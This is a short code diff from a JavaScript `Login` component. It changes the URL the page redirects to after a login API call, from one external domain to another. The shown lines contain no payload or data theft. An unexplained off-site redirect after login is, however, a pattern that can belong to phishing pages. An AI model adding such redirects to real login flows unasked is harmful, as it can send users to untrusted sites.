@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://mr.fregate.shop/';
+      window.location.href = 'https://mr.moralemadefiles.top/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
